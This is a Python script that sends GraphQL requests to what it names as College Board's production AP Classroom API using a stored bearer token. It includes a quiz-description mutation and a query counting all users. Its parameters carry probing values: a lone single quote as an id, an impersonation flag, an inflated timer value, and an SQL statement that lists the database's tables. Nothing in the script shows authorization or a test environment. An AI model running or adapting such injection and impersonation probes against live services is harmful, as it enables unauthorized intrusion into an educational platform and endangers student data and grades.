from gql import gql, Client
from gql.transport.requests import RequestsHTTPTransport
import time
import json

with open("./token.txt") as file:
    BEARERTOKEN = file.read()

# Create a GraphQL client
transport = RequestsHTTPTransport(
    url="https://apc-api-production.collegeboard.org/fym/graphql",
    use_json=True,
    headers={"Authorization": BEARERTOKEN, "Content-Type": "application/json"},
    verify=True,
    retries=3,
)

client = Client(transport=transport, fetch_schema_from_transport=False)

# GraphQL query template
mquery = gql(
    """
    
    mutation updateQuizDescription($item_id: Int!, $description: String!) {
        updateQuizDescription(itemId: $item_id, description: $description) {
            ok
        }
    }

"""
)
# GraphQL query template
rquery = gql(
    """
    query users {
        users{
            totalCount
        }
    }


"""
)

# List of different assignment IDs
assignment_ids = ["63276724"]
STUDENTID = "228490232"

# Execute the query for each assignment ID
for assignment_id in assignment_ids:
    start_time = time.time()

    params = {
        'id': "'",
        # "assignmentId": "66906187",
        "sort": "on",
        "filter": None,
        "before": None,
        "after": None,
        "first": None,
        "last": None,
        "assignmentId": "66906187",
        "item_id": "0",
        "scores": '["36"]',
        "scoringCompleted": False,
        "studentId": STUDENTID,
        "studentIds": [STUDENTID],
        "subjectId": 1,
        "educationPeriod": "26",
        "isImpersonating": True,
        "masterSubjectId": "1",
        "includePriorStudents": "True",
        "copyQuestion": True,
        "minutes": 50000000,
        "description": "SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();",
    }
    result = client.execute(rquery, variable_values=params)
    end_time = time.time()
    elapsed_time = end_time - start_time
    print(f"Elapsed time: {elapsed_time} seconds")
    with open("output.json", "w") as file:
        file.write(json.dumps(result, indent=2))
    print(result)  # Output the result of each query
